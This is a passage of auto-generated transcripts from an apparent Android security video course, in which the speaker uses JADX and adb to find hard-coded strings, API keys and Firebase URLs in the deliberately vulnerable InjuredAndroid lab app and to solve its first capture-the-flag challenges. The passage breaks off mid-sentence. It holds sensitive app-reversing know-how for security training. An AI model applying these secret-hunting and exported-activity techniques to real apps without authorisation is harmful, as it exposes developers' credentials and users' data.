But if we scroll through this file, you

75
00:03:00.280 --> 00:03:02.540
can see all these types of strings and

76
00:03:03.180 --> 00:03:06.940
usually these strings are something like a little

77
00:03:06.940 --> 00:03:09.160
string that's shown in the UI right here.

78
00:03:09.160 --> 00:03:10.660
Like here it says there's a way to

79
00:03:10.660 --> 00:03:12.920
bypass the main activity, invoke other activities that

80
00:03:12.920 --> 00:03:13.480
are exported.

81
00:03:14.080 --> 00:03:16.180
That is something that pops up in the

82
00:03:16.180 --> 00:03:17.420
application itself.

83
00:03:17.840 --> 00:03:19.760
You can also keep on scrolling down here

84
00:03:19.760 --> 00:03:21.660
and as you look through here, you want

85
00:03:21.660 --> 00:03:23.680
to look for anything that might be suspicious,

86
00:03:24.400 --> 00:03:26.360
anything that might give you some more information

87
00:03:26.360 --> 00:03:29.740
about the application or possible things like client

88
00:03:29.740 --> 00:03:30.880
IDs or URLs.

89
00:03:31.560 --> 00:03:33.980
So for example here, here's a default web

90
00:03:33.980 --> 00:03:34.800
client ID.

91
00:03:34.800 --> 00:03:37.360
These are not usually something that is sensitive,

92
00:03:37.840 --> 00:03:39.820
but you could be looking for a client

93
00:03:39.820 --> 00:03:41.160
ID generally speaking.

94
00:03:42.020 --> 00:03:43.860
Scrolling down a bit more we find this

95
00:03:43.860 --> 00:03:45.340
firebase database URL.

96
00:03:45.860 --> 00:03:47.540
This could be something helpful for us.

97
00:03:47.620 --> 00:03:49.260
This is a new website we did not

98
00:03:49.260 --> 00:03:50.200
know about before.

99
00:03:50.580 --> 00:03:51.780
So we want to go out and do

100
00:03:51.780 --> 00:03:54.000
our research and see how this URL is

101
00:03:54.000 --> 00:03:55.560
being used by the application.

102
00:03:56.440 --> 00:03:58.380
Scrolling down a bit more we have the

103
00:03:58.380 --> 00:04:00.760
Google API key here in the Google app

104
00:04:00.760 --> 00:04:03.480
ID and the Google crash reporting API key.

105
00:04:03.480 --> 00:04:06.000
Now this Google, especially if you see a

106
00:04:06.000 --> 00:04:09.280
Google Maps ID or a key here, that

107
00:04:09.280 --> 00:04:11.440
can be utilized to make a bunch of

108
00:04:11.440 --> 00:04:14.760
calls using their map service and you can

109
00:04:14.760 --> 00:04:16.940
actually run over costs and things like that

110
00:04:16.940 --> 00:04:18.560
on the Android application.

111
00:04:19.180 --> 00:04:20.519
You can also see that we have this

112
00:04:20.519 --> 00:04:23.920
like injured Android dot app spot Google storage

113
00:04:23.920 --> 00:04:24.200
bucket.

114
00:04:24.400 --> 00:04:26.320
So this is something else that's new that

115
00:04:26.320 --> 00:04:27.740
you want to go out and do some

116
00:04:27.740 --> 00:04:28.860
actual research on.

117
00:04:29.340 --> 00:04:33.500
Scrolling down a bit more there doesn't seem

118
00:04:33.500 --> 00:04:35.100
to be much more sensitive here.

119
00:04:35.220 --> 00:04:37.020
We just have some things that are strings

120
00:04:37.020 --> 00:04:40.060
like, you know, flag for activity, things that

121
00:04:40.060 --> 00:04:41.720
are within the application here.

122
00:04:42.060 --> 00:04:44.220
But you would want to keep on looking

123
00:04:44.220 --> 00:04:46.460
through this file and make sure that you

124
00:04:46.460 --> 00:04:47.640
did not miss anything.

125
00:04:48.040 --> 00:04:50.020
Something nice about JADX 2 is that you

126
00:04:50.020 --> 00:04:51.660
can always do a control F.

127
00:04:52.000 --> 00:04:53.720
So if I wanted to look in this

128
00:04:53.720 --> 00:04:56.480
file specifically for certain things, I could just

129
00:04:56.480 --> 00:04:57.820
do API here.

130
00:04:57.820 --> 00:05:00.100
It will start finding all the things with

131
00:05:00.100 --> 00:05:00.520
API.

132
00:05:00.920 --> 00:05:02.500
Obviously, we're going to run into some things

133
00:05:02.500 --> 00:05:04.220
that have API as part of the word.

134
00:05:04.560 --> 00:05:06.380
But like for example, this finds the Google

135
00:05:06.380 --> 00:05:08.780
API key and if I keep on pressing

136
00:05:08.780 --> 00:05:10.980
enter it will go through all the results

137
00:05:10.980 --> 00:05:11.300
here.

138
00:05:11.620 --> 00:05:13.480
You also want to look for things like

139
00:05:13.480 --> 00:05:16.320
ID or password in this file if you

140
00:05:16.320 --> 00:05:18.280
can find anything related to passwords.

141
00:05:18.920 --> 00:05:20.360
If there maybe was a password that you

142
00:05:20.360 --> 00:05:22.080
missed when you were scrolling through the file.

143
00:05:22.320 --> 00:05:24.440
In this case as we're going through this

144
00:05:24.440 --> 00:05:25.820
there's not really any here.

145
00:05:26.580 --> 00:05:28.620
But it's something I would still look for

146
00:05:28.620 --> 00:05:32.080
in the strings.xml. Obviously anything else would

147
00:05:32.080 --> 00:05:34.980
be something like AWS, for example, which in

148
00:05:34.980 --> 00:05:37.280
our case is going to get this AWS

149
00:05:37.280 --> 00:05:39.500
ID and that AWS secret key that we

150
00:05:39.500 --> 00:05:41.940
saw at the top of this strings.xml

151
00:05:41.940 --> 00:05:42.420
file.

152
00:05:42.840 --> 00:05:44.820
So you'd want to look for common things

153
00:05:44.820 --> 00:05:45.340
like that.

154
00:05:45.680 --> 00:05:47.180
And also if there's a lot of things

155
00:05:47.180 --> 00:05:49.060
in here, you would want to do something

156
00:05:49.060 --> 00:05:53.380
like looking for HTTP or HTTPS, right?

157
00:05:53.760 --> 00:05:56.540
And we would get the injured Android HTTPS

158
00:05:56.540 --> 00:05:59.780
here and there's not really any other HTTPSs

159
00:05:59.780 --> 00:06:02.820
in the strings.xml. We can also go

160
00:06:02.820 --> 00:06:04.800
to other files that are here such as

161
00:06:04.800 --> 00:06:07.500
the xml.xml, see if anything is stored

162
00:06:07.500 --> 00:06:07.860
there.

163
00:06:08.460 --> 00:06:10.820
These two are the most common ones where

164
00:06:10.820 --> 00:06:13.260
I found certain things being stored the xml

165
00:06:13.260 --> 00:06:16.940
.xml and also the strings.xml. There might

166
00:06:16.940 --> 00:06:19.880
possibly be interesting things in integers someday.

167
00:06:20.140 --> 00:06:22.580
If you're dealing with something that might have

168
00:06:22.580 --> 00:06:25.120
different, you know, maybe a coupon code is

169
00:06:25.120 --> 00:06:27.360
an integer defined in this type of area.

170
00:06:28.080 --> 00:06:30.600
But we can also extend our search for

171
00:06:30.600 --> 00:06:33.340
hard-coded strings far outside of the strings

172
00:06:33.340 --> 00:06:35.880
.xml. This is not the only file that

173
00:06:35.880 --> 00:06:36.900
we need to look at.

174
00:06:37.340 --> 00:06:39.960
And a nice feature about JADX, why I

175
00:06:39.960 --> 00:06:41.640
like this tool so much, is there's this

176
00:06:41.640 --> 00:06:45.780
magic wand text search tool right here in

177
00:06:45.780 --> 00:06:46.600
the top left.

178
00:06:47.000 --> 00:06:48.600
So I'm going to click this and what

179
00:06:48.600 --> 00:06:50.500
this allows you to do is it allows

180
00:06:50.500 --> 00:06:53.140
you to sort search through all the source

181
00:06:53.140 --> 00:06:55.060
code for certain text.

182
00:06:55.540 --> 00:06:57.700
So when I'm just doing a quick look

183
00:06:57.700 --> 00:07:00.360
over an application and looking through the source

184
00:07:00.360 --> 00:07:03.160
code, I will use this magic wand to

185
00:07:03.160 --> 00:07:04.320
do some basic searches.

186
00:07:04.560 --> 00:07:07.060
So for example, if I'm looking for URLs,

187
00:07:07.360 --> 00:07:13.260
I will do HTTP colon slash slash like

188
00:07:13.260 --> 00:07:15.580
this and try to find where all of

189
00:07:15.580 --> 00:07:18.200
these HTTPs are to see where clear text

190
00:07:18.200 --> 00:07:20.600
traffic might be being sent by the application.

191
00:07:21.500 --> 00:07:23.520
And the cool thing about JADX here is

192
00:07:23.520 --> 00:07:26.940
that you can also increase the scope of

193
00:07:26.940 --> 00:07:27.460
your search.

194
00:07:27.540 --> 00:07:28.940
So you can go to the classes, the

195
00:07:28.940 --> 00:07:31.080
methods, the fields, and also the code.

196
00:07:31.480 --> 00:07:33.020
For now, I'll leave it on code.

197
00:07:33.400 --> 00:07:34.600
And you can see here that we pulled

198
00:07:34.600 --> 00:07:38.040
up some HTTP addresses here that we didn't

199
00:07:38.040 --> 00:07:40.140
see before and these are not really sensitive

200
00:07:40.140 --> 00:07:40.640
ones.

201
00:07:40.640 --> 00:07:42.740
But it's possible that you might find that

202
00:07:42.740 --> 00:07:45.000
kind of thing in the application source code

203
00:07:45.000 --> 00:07:46.980
when you're doing this for a different application.

204
00:07:47.480 --> 00:07:50.160
Obviously, I can change this to HTTPS.

205
00:07:50.400 --> 00:07:50.540
Oops.

206
00:07:51.720 --> 00:07:53.740
And see what has changed here.

207
00:07:53.860 --> 00:07:56.060
You can see some references to say for

208
00:07:56.060 --> 00:07:57.900
example, plus.google.com.

209
00:07:58.020 --> 00:08:01.380
Some references here also to some Firebase type

210
00:08:01.380 --> 00:08:01.900
of things.

211
00:08:02.140 --> 00:08:06.000
Firebase database encountered some errors, things like that.

212
00:08:06.720 --> 00:08:08.760
But the bad part about this, as you

213
00:08:08.760 --> 00:08:10.180
can see, is that we're not getting the

214
00:08:10.180 --> 00:08:12.440
exact same strings that we found in the

215
00:08:12.440 --> 00:08:13.500
.xml file.

216
00:08:13.760 --> 00:08:15.660
So this is actually kind of searching the

217
00:08:15.660 --> 00:08:17.940
source code as opposed to those resources.

218
00:08:18.340 --> 00:08:20.180
And that's why we need to search in

219
00:08:20.180 --> 00:08:21.060
both locations.

220
00:08:21.560 --> 00:08:24.040
And likewise, I can obviously do things like

221
00:08:24.040 --> 00:08:25.080
API here.

222
00:08:25.340 --> 00:08:27.160
I'm sorry, I keep on closing the window.

223
00:08:27.980 --> 00:08:30.600
You can see all the places where API

224
00:08:30.600 --> 00:08:32.640
is called in our source code.

225
00:08:32.640 --> 00:08:35.140
You can see like signin.API here for

226
00:08:35.140 --> 00:08:36.260
one of these methods.

227
00:08:37.299 --> 00:08:39.179
Usage of the Google API key.

228
00:08:39.780 --> 00:08:42.440
And all these results are paginated as well.

229
00:08:42.940 --> 00:08:45.380
So you have to go through every single

230
00:08:45.380 --> 00:08:47.400
one of these pages as you're looking through.

231
00:08:47.760 --> 00:08:50.480
There's not really anything particularly sensitive here.

232
00:08:50.920 --> 00:08:53.300
But it's something that I would do if

233
00:08:53.300 --> 00:08:55.260
I was doing this for an application.

234
00:08:55.880 --> 00:08:58.280
Likewise, I would look for any instance where

235
00:08:58.280 --> 00:08:59.700
there was maybe a password.

236
00:09:01.320 --> 00:09:03.600
Sorry, I will change this to password and

237
00:09:03.600 --> 00:09:04.940
not press enter this time.

238
00:09:05.320 --> 00:09:07.500
And see where passwords might be in the

239
00:09:07.500 --> 00:09:08.520
actual source code.

240
00:09:08.620 --> 00:09:11.040
So like for example here, we have flag

241
00:09:11.040 --> 00:09:12.480
7 password encrypted.

242
00:09:12.700 --> 00:09:14.700
Some kind of a password is being encrypted

243
00:09:14.700 --> 00:09:16.240
for one of these flags.

244
00:09:17.320 --> 00:09:19.940
So I would also look for obviously things

245
00:09:19.940 --> 00:09:22.920
like username, kind of similar thing like we

246
00:09:22.920 --> 00:09:25.400
did for the strings.xml to try to

247
00:09:25.400 --> 00:09:26.060
find anything.

248
00:09:26.260 --> 00:09:28.300
And also I would look for like firebase

249
00:09:28.300 --> 00:09:31.860
.io. See if that's being called anywhere in

250
00:09:31.860 --> 00:09:32.860
the code as well.

251
00:09:32.940 --> 00:09:34.560
If there's a different firebase database.

252
00:09:35.120 --> 00:09:37.000
And also something you can do is look

253
00:09:37.000 --> 00:09:39.980
for anything related to SQL statements.

254
00:09:40.380 --> 00:09:43.660
So for example here, we can see like

255
00:09:43.660 --> 00:09:46.140
flag 7 SQL activity comes up.

256
00:09:46.220 --> 00:09:49.000
You can also see some portions of some

257
00:09:49.000 --> 00:09:52.080
SQL code that is being used by this

258
00:09:52.080 --> 00:09:52.600
application.

259
00:09:52.900 --> 00:09:55.040
And here we actually have this thing called

260
00:09:55.040 --> 00:09:57.760
this is a test.db. And this can

261
00:09:57.760 --> 00:10:01.880
give you some hints about where the application

262
00:10:01.880 --> 00:10:04.300
data might actually be stored in a SQLite

263
00:10:04.300 --> 00:10:04.680
database.

264
00:10:04.920 --> 00:10:06.780
So we can actually see this later when

265
00:10:06.780 --> 00:10:08.560
we get to the dynamic analysis section.

266
00:10:08.720 --> 00:10:10.280
We'll be taking a look at this database

267
00:10:10.280 --> 00:10:12.620
and looking at what kind of data is

268
00:10:12.620 --> 00:10:13.960
actually stored in there.

269
00:10:14.300 --> 00:10:16.440
So that's kind of the methodology that I

270
00:10:16.440 --> 00:10:18.200
use when I'm using Jadex.

271
00:10:18.340 --> 00:10:20.780
I will go through the resources and go

272
00:10:20.780 --> 00:10:22.640
to that strings.xml file.

273
00:10:23.200 --> 00:10:25.660
Obviously take a good manual look through there

274
00:10:25.660 --> 00:10:28.360
for anything that might be sensitive and also

275
00:10:28.360 --> 00:10:30.540
use ctrl-f to try to find certain

276
00:10:30.540 --> 00:10:30.920
things.

277
00:10:31.420 --> 00:10:33.360
And then I will expand my scope to

278
00:10:33.360 --> 00:10:35.580
the source code by using this magic wand

279
00:10:35.580 --> 00:10:38.760
tool to look for anything related to SQL,

280
00:10:38.960 --> 00:10:43.760
HTTP, HTTPS, API keys, usernames, passwords.

281
00:10:44.300 --> 00:10:46.240
Anything like that that you think might be

282
00:10:46.240 --> 00:10:46.600
sensitive.

283
00:10:46.860 --> 00:10:49.640
Also another good keyword to use is just

284
00:10:49.640 --> 00:10:50.540
the word key.

285
00:10:50.960 --> 00:10:53.560
Now here like I got 7,000 results.

286
00:10:54.040 --> 00:10:56.060
So you might want to add some things

287
00:10:56.060 --> 00:10:57.940
in here and maybe you want to look

288
00:10:57.940 --> 00:10:59.740
for things like a client ID.

289
00:11:00.380 --> 00:11:02.120
You can see like here maybe a client

290
00:11:02.120 --> 00:11:05.340
ID or a client secret if they're being

291
00:11:05.340 --> 00:11:08.600
defined anywhere in the source code.

292
00:11:08.700 --> 00:11:10.500
Let me change this to a C.

293
00:11:11.620 --> 00:11:13.540
No instances of client secret.

294
00:11:14.200 --> 00:11:15.900
But this is exactly what I would do

295
00:11:15.900 --> 00:11:17.500
if I was doing a bug bounty hunt

296
00:11:17.500 --> 00:11:19.940
against an application I didn't know anything about

297
00:11:19.940 --> 00:11:22.500
and as part of my static analysis process,

298
00:11:22.760 --> 00:11:25.060
so I have a holistic look at the

299
00:11:25.060 --> 00:11:25.680
application.

300
00:11:25.960 --> 00:11:28.220
I looked at the strings.xml. I looked

301
00:11:28.220 --> 00:11:31.000
at the xml.xml and I looked through

302
00:11:31.000 --> 00:11:34.000
the source code generally speaking for certain things.

303
00:11:34.440 --> 00:11:37.040
And then after I get some semblance of

304
00:11:37.040 --> 00:11:38.860
what is stored out there in the application,

305
00:11:39.480 --> 00:11:41.260
then I will go out and start to

306
00:11:41.260 --> 00:11:44.300
exploit some of the activities and move on

307
00:11:44.300 --> 00:11:45.820
to some of the stages like we'll see

308
00:11:45.820 --> 00:11:48.380
in the next video when I'm actually exploiting

309
00:11:48.380 --> 00:11:50.380
some of the flags in the injured Android

310
00:11:50.380 --> 00:11:51.120
application.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.340 --> 00:00:01.660
(Transcribed by TurboScribe. Go Unlimited to remove this message.) All right, now that we have an idea

2
00:00:01.660 --> 00:00:03.780
of how to do threat hunting for basic

3
00:00:03.780 --> 00:00:06.680
hard-coded strings and things like that, let's

4
00:00:06.680 --> 00:00:09.400
put everything together with our knowledge of the

5
00:00:09.400 --> 00:00:12.920
AndroidManifest.xml and solve some flags out of

6
00:00:12.920 --> 00:00:14.600
the Injured Android application.

7
00:00:15.160 --> 00:00:17.280
So here I am in Injured Android, and

8
00:00:17.280 --> 00:00:18.980
we're going to do the first four flags

9
00:00:18.980 --> 00:00:19.160
here.

10
00:00:19.240 --> 00:00:22.100
We're going to do flag1, flag2, flag3, and

11
00:00:22.100 --> 00:00:22.820
flag4.

12
00:00:22.820 --> 00:00:25.840
Let's go into flag1, login activity.

13
00:00:26.380 --> 00:00:28.540
If we want to actually see the real

14
00:00:28.540 --> 00:00:31.659
source code for this activity, we can open

15
00:00:31.659 --> 00:00:33.060
our source code here.

16
00:00:33.520 --> 00:00:36.200
When we have ChatX open, click source code.

17
00:00:37.360 --> 00:00:39.700
Here there's a bunch of different folders.

18
00:00:39.980 --> 00:00:41.440
You don't really have to be distracted by

19
00:00:41.440 --> 00:00:44.540
any of those necessarily besides the BNAC Injured

20
00:00:44.540 --> 00:00:47.700
Android one for this static analysis, but just

21
00:00:47.700 --> 00:00:49.760
know that you might find other things like

22
00:00:49.760 --> 00:00:52.580
libraries or third-party code stored here as

23
00:00:52.580 --> 00:00:54.720
well if you ever do a bug bounty

24
00:00:54.720 --> 00:00:56.580
hunt of a different application.

25
00:00:57.020 --> 00:00:58.940
I'm going to click the BNAC Injured Android

26
00:00:58.940 --> 00:01:01.940
here, and the screen that we're actually looking

27
00:01:01.940 --> 00:01:04.220
at is the flag1 login activity.

28
00:01:04.580 --> 00:01:06.440
So let's actually click this and look at

29
00:01:06.440 --> 00:01:07.280
the source code.

30
00:01:07.600 --> 00:01:09.500
So we can see in the application that

31
00:01:09.500 --> 00:01:11.340
if we click this button here, we get

32
00:01:11.340 --> 00:01:13.240
this hint that says the flag is right

33
00:01:13.240 --> 00:01:16.560
under your nose, and this actually corresponds directly

34
00:01:16.560 --> 00:01:19.020
with the source code here where we have

35
00:01:19.020 --> 00:01:20.160
our little hints, right?

36
00:01:20.460 --> 00:01:22.180
So we have a snack bar, and snack

37
00:01:22.180 --> 00:01:23.780
bar basically means we're going to have a

38
00:01:23.780 --> 00:01:25.900
UI element that pops up off the bottom

39
00:01:25.900 --> 00:01:27.260
of the screen just like this.

40
00:01:27.720 --> 00:01:29.620
And the first one says the flag is

41
00:01:29.620 --> 00:01:31.560
right under your nose, and the second one

42
00:01:31.560 --> 00:01:34.120
says the flag is also under the GUI.

43
00:01:34.660 --> 00:01:36.640
We also have a text box here.

44
00:01:36.740 --> 00:01:38.060
We can input text, right?

45
00:01:38.520 --> 00:01:40.760
So something a developer might do is take

46
00:01:40.760 --> 00:01:44.060
whatever text is in this box and actually

47
00:01:44.060 --> 00:01:45.680
compare it to a string.

48
00:01:45.820 --> 00:01:47.720
So let's scroll down a bit more and

49
00:01:47.720 --> 00:01:50.020
see if they're doing that in this activity.

50
00:01:50.700 --> 00:01:52.640
So scrolling down here, we can see our

51
00:01:52.640 --> 00:01:55.820
submit flag code here, right?

52
00:01:55.980 --> 00:01:58.000
So this is our method for submit flag.

53
00:01:58.100 --> 00:02:00.600
We have edit text, edit text, right?

54
00:02:00.940 --> 00:02:02.700
So that is what this text box is

55
00:02:02.700 --> 00:02:04.580
that we're actually editing in the box.

56
00:02:05.060 --> 00:02:06.580
And if we go down a little bit

57
00:02:06.580 --> 00:02:08.699
more, we can see edit text dot get

58
00:02:08.699 --> 00:02:12.420
text convert to a string here is matching

59
00:02:12.420 --> 00:02:16.000
up against this string that says flag one.

60
00:02:16.940 --> 00:02:18.740
And so this is something a developer might

61
00:02:18.740 --> 00:02:21.000
do where they have a hard-coded string

62
00:02:21.000 --> 00:02:22.080
to compare against.

63
00:02:22.420 --> 00:02:24.700
So let's see if this actually works as

64
00:02:24.700 --> 00:02:25.600
our first flag.

65
00:02:26.200 --> 00:02:28.960
Delete what I have in here and paste

66
00:02:28.960 --> 00:02:29.940
that right there.

67
00:02:30.080 --> 00:02:31.540
And we can see we got our very

68
00:02:31.540 --> 00:02:32.320
first flag.

69
00:02:32.700 --> 00:02:34.400
So you might think that this is such

70
00:02:34.400 --> 00:02:38.300
an easy, easy threat vector to exploit.

71
00:02:38.640 --> 00:02:39.520
And you would be right.

72
00:02:39.940 --> 00:02:42.120
But sometimes you can even find this in

73
00:02:42.120 --> 00:02:44.980
modern applications where a developer is actually using

74
00:02:44.980 --> 00:02:46.080
a hard-coded string.

75
00:02:46.600 --> 00:02:49.880
Maybe this isn't a flag like this.

76
00:02:49.960 --> 00:02:50.860
Maybe it's a username.

77
00:02:51.180 --> 00:02:52.200
Maybe it's a password.

78
00:02:52.700 --> 00:02:55.120
Maybe it's some kind of special key utilised

79
00:02:55.120 --> 00:02:57.040
for a network call, right?

80
00:02:57.200 --> 00:02:59.500
So you can still find this in applications

81
00:02:59.500 --> 00:03:02.060
today where we're able to actually get the

82
00:03:02.060 --> 00:03:04.340
hard-coded string out of the source code.

83
00:03:04.800 --> 00:03:06.200
All right, so now that we've got this

84
00:03:06.200 --> 00:03:08.880
flag, let's go to the flag number two.

85
00:03:09.540 --> 00:03:11.820
It says flag two exported activity.

86
00:03:12.160 --> 00:03:14.220
If you think back to our android manifest

87
00:03:14.220 --> 00:03:16.860
dot xml lesson, this one should be pretty

88
00:03:16.860 --> 00:03:17.380
obvious.

89
00:03:17.560 --> 00:03:18.860
Let's look at our hints here.

90
00:03:18.980 --> 00:03:21.140
Keywords, activity, and exported.

91
00:03:22.260 --> 00:03:24.940
Exported activities can be accessed with adb.

92
00:03:25.460 --> 00:03:27.160
And we talked about this in the android

93
00:03:27.160 --> 00:03:28.480
manifest dot xml.

94
00:03:28.660 --> 00:03:29.440
So let's go there.

95
00:03:30.000 --> 00:03:32.040
And something we could do right now for

96
00:03:32.040 --> 00:03:33.900
this kind of example, we could do a

97
00:03:33.900 --> 00:03:37.300
control f and look for exported equals true

98
00:03:37.300 --> 00:03:39.820
like this if we did not take very

99
00:03:39.820 --> 00:03:41.960
good notes of what we had before, right?

100
00:03:42.360 --> 00:03:44.780
But in my case, I think I might

101
00:03:44.780 --> 00:03:45.820
know where this is.

102
00:03:45.900 --> 00:03:48.720
So I'm going to close that and just

103
00:03:48.720 --> 00:03:50.300
scroll down here a bit more.

104
00:03:51.720 --> 00:03:55.200
And we can see this b25l activity says

105
00:03:55.200 --> 00:03:56.580
exported equals true.

106
00:03:56.820 --> 00:03:58.920
We scroll around a little bit more.

107
00:03:59.320 --> 00:04:04.620
There's also another one right here.

108
00:04:05.780 --> 00:04:09.180
I think I just saw this qxvo activity

109
00:04:09.180 --> 00:04:10.340
is also exported.

110
00:04:10.500 --> 00:04:12.220
So it could be really any one of

111
00:04:12.220 --> 00:04:13.380
these two activities.

112
00:04:13.960 --> 00:04:16.540
For now, let's go for the b25l since

113
00:04:16.540 --> 00:04:19.220
it says b2 might be a hint for

114
00:04:19.220 --> 00:04:19.800
flag two.

115
00:04:20.000 --> 00:04:22.140
And it's also right next to the flag

116
00:04:22.140 --> 00:04:22.820
two activity.

117
00:04:23.380 --> 00:04:26.140
So I'm going to copy this activity name.

118
00:04:26.740 --> 00:04:28.220
And what we can actually do with an

119
00:04:28.220 --> 00:04:30.260
exported activity, if you think back to the

120
00:04:30.260 --> 00:04:33.700
android manifest dot xml lesson, we can actually

121
00:04:33.700 --> 00:04:37.180
access these activities from anywhere on the phone.

122
00:04:37.600 --> 00:04:39.900
So it could be from a different application,

123
00:04:40.240 --> 00:04:42.260
or it could also be directly from our

124
00:04:42.260 --> 00:04:42.540
phone.

125
00:04:42.960 --> 00:04:44.560
How we're going to exploit this, we're going

126
00:04:44.560 --> 00:04:48.820
to go back to Android Studio here, I'm

127
00:04:48.820 --> 00:04:51.160
going to do an adb shell to get

128
00:04:51.160 --> 00:04:53.040
into my Android phone.

129
00:04:53.760 --> 00:04:55.180
And now you can see I kind of

130
00:04:55.180 --> 00:04:57.600
have the example here already, we can do

131
00:04:57.600 --> 00:04:58.600
an am start.

132
00:04:58.820 --> 00:05:01.160
And this means we're going to start a

133
00:05:01.160 --> 00:05:02.740
application activity.

134
00:05:02.960 --> 00:05:05.100
And we can actually paste the activity that

135
00:05:05.100 --> 00:05:05.620
we found.

136
00:05:06.020 --> 00:05:07.880
And what we need to do here is

137
00:05:07.880 --> 00:05:10.500
do a forward slash right before the dot

138
00:05:10.500 --> 00:05:11.860
for the activity name.

139
00:05:12.100 --> 00:05:14.660
So we're saying start this activity from the

140
00:05:14.660 --> 00:05:17.340
application bnack dot injured Android.

141
00:05:18.120 --> 00:05:22.520
And the activity name is b25l activity, you

142
00:05:22.520 --> 00:05:24.420
can see here that we're on activity two,

143
00:05:24.780 --> 00:05:26.760
we're going to press enter on the terminal.

144
00:05:27.040 --> 00:05:29.240
And it's going to start that activity and

145
00:05:29.240 --> 00:05:31.660
bring us to a new UI screen.

146
00:05:32.140 --> 00:05:33.900
So here we are with our second flag

147
00:05:33.900 --> 00:05:34.240
now.

148
00:05:34.780 --> 00:05:37.740
And the activity popped up successfully because this

149
00:05:37.740 --> 00:05:39.140
is an exported activity.

150
00:05:39.400 --> 00:05:42.340
So in a bug bounty sense, or a

151
00:05:42.340 --> 00:05:45.120
modern application sense, you might find this as

152
00:05:45.120 --> 00:05:47.260
maybe a part of the application that you're

153
00:05:47.260 --> 00:05:49.620
not supposed to be allowed to get to,

154
00:05:49.700 --> 00:05:49.920
right.

155
00:05:50.340 --> 00:05:52.600
So if an activity is exported, we always

156
00:05:52.600 --> 00:05:54.460
want to make sure that that activity does

157
00:05:54.460 --> 00:05:56.900
not have any sensitive data, or it's not

158
00:05:56.900 --> 00:05:58.680
allowing us to see some kind of a

159
00:05:58.680 --> 00:06:02.160
UI screen that, you know, is not relevant

160
00:06:02.160 --> 00:06:04.080
for what we need to see as a

161
00:06:04.080 --> 00:06:05.020
penetration tester.

162
00:06:05.520 --> 00:06:07.100
So that's how we got our second flag

163
00:06:07.100 --> 00:06:07.440
here.

164
00:06:07.740 --> 00:06:10.340
Let's move on to flag three resources.

165
00:06:11.460 --> 00:06:14.220
The hints here say R stands for resources

166
00:06:14.220 --> 00:06:16.280
and check dot XML files.

167
00:06:16.540 --> 00:06:19.140
Well, if we're lucky here, maybe this applicant,

168
00:06:19.420 --> 00:06:22.280
this flag right here is very similar to

169
00:06:22.280 --> 00:06:23.620
activity one, right.

170
00:06:23.880 --> 00:06:25.540
So let's actually go look at the source

171
00:06:25.540 --> 00:06:26.640
code for this activity.

172
00:06:27.060 --> 00:06:29.760
And this would be flag three activity right

173
00:06:29.760 --> 00:06:30.060
here.

174
00:06:30.420 --> 00:06:32.540
And of course, we have our source code

175
00:06:32.540 --> 00:06:34.840
saying R stands for resources and the check

176
00:06:34.840 --> 00:06:37.480
the XML files, we scroll down a bit

177
00:06:37.480 --> 00:06:37.880
more.

178
00:06:38.460 --> 00:06:40.720
And in our if statement here, we have

179
00:06:40.720 --> 00:06:43.140
something a little bit different than what flag

180
00:06:43.140 --> 00:06:44.060
number one was.

181
00:06:44.360 --> 00:06:46.140
So we still have our edit text, we're

182
00:06:46.140 --> 00:06:48.380
converting that to a string just like before.

183
00:06:48.680 --> 00:06:50.520
But now we have this new thing that

184
00:06:50.520 --> 00:06:53.760
says get string r dot string equals CMV,

185
00:06:53.900 --> 00:06:54.320
blah, blah, blah.

186
00:06:54.720 --> 00:06:57.360
And they kind of randomly named this variable

187
00:06:57.360 --> 00:06:58.000
in a way.

188
00:06:58.420 --> 00:06:59.760
So I'm going to copy this.

189
00:07:00.500 --> 00:07:02.540
And this r dot strings means that we

190
00:07:02.540 --> 00:07:05.340
should be able to find this string name

191
00:07:05.340 --> 00:07:08.400
in our resources in our strings dot XML.

192
00:07:08.860 --> 00:07:12.920
So let's scroll down, go to resources, res,

193
00:07:13.380 --> 00:07:15.880
values, strings dot XML.

194
00:07:16.380 --> 00:07:17.820
Now I'm just going to do a Ctrl

195
00:07:17.820 --> 00:07:20.400
F and try to find that variable name.

196
00:07:20.620 --> 00:07:22.180
You can see here that it's highlighted.

197
00:07:22.880 --> 00:07:25.440
And the variable is flag three.

198
00:07:25.740 --> 00:07:28.300
So let's copy this and see what it

199
00:07:28.300 --> 00:07:28.680
does.

200
00:07:30.320 --> 00:07:31.300
And paste.

201
00:07:33.470 --> 00:07:34.890
And we got the flag.

202
00:07:35.070 --> 00:07:38.610
So what we did between the first flag

203
00:07:38.610 --> 00:07:41.090
and the third flag are actually very similar.

204
00:07:41.230 --> 00:07:43.210
The source code was very similar, right?

205
00:07:43.510 --> 00:07:46.030
But the instance of the third flag, the

206
00:07:46.030 --> 00:07:49.250
developer actually tried to kind of obfuscate the

207
00:07:49.250 --> 00:07:50.370
answer in a way.

208
00:07:50.450 --> 00:07:53.150
So instead of storing a hard coded string

209
00:07:53.150 --> 00:07:56.010
directly in the source code here, they relied

210
00:07:56.010 --> 00:07:58.790
on the strings dot XML to store that

211
00:07:58.790 --> 00:08:01.050
hard coded string, we can see that it's

212
00:08:01.050 --> 00:08:03.670
really not that much more secure, it only

213
00:08:03.670 --> 00:08:06.090
took us like one more step to make

214
00:08:06.090 --> 00:08:06.950
it this far, right?

215
00:08:07.170 --> 00:08:09.110
So if you ever see a developer doing

216
00:08:09.110 --> 00:08:11.270
this, you got to make sure you know

217
00:08:11.270 --> 00:08:13.510
that they're not doing this, because it's not

218
00:08:13.510 --> 00:08:16.410
that much harder to reverse engineer this, even

219
00:08:16.410 --> 00:08:19.330
though they actually stored the variable name with

220
00:08:19.330 --> 00:08:21.450
kind of a confusing variable, right?

221
00:08:21.970 --> 00:08:24.350
Alright, let's go on to the next flag.

222
00:08:25.450 --> 00:08:28.630
This is flag for login number two, seeing

223
00:08:28.630 --> 00:08:30.530
the hints here, it says where is Bob

224
00:08:30.530 --> 00:08:32.370
classes in import.

225
00:08:32.490 --> 00:08:33.990
So actually, let's go look at the source

226
00:08:33.990 --> 00:08:37.250
code here for flag number four, flag for

227
00:08:37.250 --> 00:08:37.789
activity.

228
00:08:38.370 --> 00:08:39.950
Let's scroll down a bit.

229
00:08:41.150 --> 00:08:42.590
And it says edit text.

230
00:08:42.789 --> 00:08:45.370
So this time, instead of having a straight

231
00:08:45.370 --> 00:08:47.730
up edit text, we're doing a string object

232
00:08:47.730 --> 00:08:51.650
conversion here, we're comparing it to this thing.

233
00:08:52.970 --> 00:08:57.610
Some byte here, a equals new c 146,

234
